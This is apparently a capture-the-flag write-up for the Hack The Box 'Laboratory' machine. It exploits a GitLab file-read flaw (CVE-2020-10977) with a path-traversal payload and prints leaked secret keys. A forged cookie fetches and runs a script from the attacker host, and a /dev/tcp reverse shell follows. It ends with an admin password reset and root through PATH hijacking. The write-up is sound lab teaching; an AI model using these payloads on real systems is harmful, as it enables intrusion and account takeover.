1, Recon
ports:
	22/tcp ssh
	80/tcp http `redirect to https://laboratory.htb/`
	443/tcp http `DNS:git.laboratory.htb`

In the original url `https://laboratory.htb/`, we could not find anything useful.

So let's come to `git.laboratory.htb`
Let's just register account and login and we can find a project from exploration.
![](images/Pasted%20image%2020240902094754.png)

Let's continue to enumerate the configs and source code.
```
CREDITS.txt

# Image Credits
All images courtesy of Unsplash (https://unsplash.com).
- Martin Grincevschi (https://unsplash.com/photos/uCnOENPOBxM)
- Pete Bellis (https://unsplash.com/photos/eDVQwVMLMgU)
- Ciprian Lipenschi (https://unsplash.com/photos/OULAwYI3AGs)
- Michael Dam (https://unsplash.com/photos/mEZ3PoFGs_k)
- rawpixel.com (https://unsplash.com/photos/izTZ-TtdwCs)
# Video Credits
Video courtesy of Coverr (http://coverr.co).
```

And we can find the version of GitLab in the url `https://git.laboratory.htb/help`
`# GitLab Community Edition [12.8.1]`
`Gitlab 12.9.0 - Arbitrary File Read (Authenticated)`
To exploit this vulnerability (CVE-2020-10977), I’ll need to create two projects:
![](images/Pasted%20image%2020240902101826.png)
Then go into proj1 and create an issue with markdown language image reference where the image is a directory traversal payload pointing to the file I want:
```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

After submitting that, expand the menu on the right side, and at the bottom of it I’ll find “Move issue”, where I can select proj2:
![](images/Pasted%20image%2020240902101952.png)
In the new issue, there’s a file linked at the top just under the issue name:
![](images/Pasted%20image%2020240902102004.png)
Then we can get the password file.

In searching for information about this exploit, I found this repo. The script is pretty slick:
https://github.com/thewhiteh4t/cve-2020-10977.git

In the script above, there’s a link to a HackerOne report, and while the report starts off as arbitrary read, the researcher finds how to convert that to code execution. I’ll start by reading /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml:
`https://hackerone.com/reports/827052`

```
# This file is managed by gitlab-ctl. Manual changes will be        
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb  
# and run `sudo gitlab-ctl reconfigure`.                                         
production:                                                                         
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |                                                     
    -----BEGIN RSA PRIVATE KEY-----                                                 
    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu
    YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV
    RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt
...[snip]...
```

For the exploit to work, my payload will need to be created in an environment with the same secret_key_base.

```
curl -k "https://git.laboratory.htb/users/sign_in" --cookie "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVMtQVNDSUkKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIDEwLjEwLjE0LjY1OjgwL3NoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcNVVMtQVNDSUkGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7CkY6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--dab2808d1a9cfde53d6b2579d76dc683dd992158"

```

Remember to make the `sh` and start the http service
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.8/443 0>&1
```

Then we get the shell of git.

It becomes clear very quickly that there’s not much here except for GitLab, and I’m in a Docker container:

There’s no users in /home.
Common binaries like ip, ifconfig, and netstat are not installed.
There’s a `/.dockerenv`file.

I can pull the local IP address from `/proc/net/fib_trie`:
```
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
```

I’ll start the console:
`gitlab-rails console`

I can list the users, and the admin users:
```
irb(main):001:0> User.active
User.active
User.active
=> #<ActiveRecord::Relation [#<User id:4 @seven>, #<User id:1 @dexter>, #<User 

id:5 @wither>]>
irb(main):002:0> User.admins
User.admins
User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
```

Since dexter is the only admin, perhaps I could reset his password:
```
user = User.find(1)
user.password = '123456789'
user.password_confirmation = '123456789'
user.save!
```

We finally successfully login to the admin page and get the secret git project, and we can get the .ssh directory.
![](images/Pasted%20image%2020240906113909.png)

Then use the id_rsa, we successfully login.

3,shell as root
Looking at the SUID binaries on the box, one jumped out as something custom to this box:
```
root     dexter             16720 Aug 28  2020 /usr/local/bin/docker-security
root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
These would be useful for us.

/usr/local/bin/docker-security is probably what was referenced in the todo.txt from the repo.

I could pull this binary back and reverse it in Ghidra, but given this is an easy-rated box, I’ll start with ltrace (which fortunately is installed on this box):

```
setuid(0)                                                                                                    = -1
setgid(0)                                                                                                    = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                       = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                       = 256
+++ exited (status 0) +++
```

The binary is calling system("chmod ..."). The important part here is that it isn’t using the full path to chmod. That is something I can exploit.

By using one of the Path-Hijacking Techniques, we can get root shell easily.
Make a file named chmod contains /bin/bash then give it execution permission with :
```
#!/bin/bash
/bin/bash
```

`chmod +x ./chmod`
`export PATH=$(pwd):$PATH`
`PATH=$(pwd):$PATH docker-security`

Then we can handle shell as root.
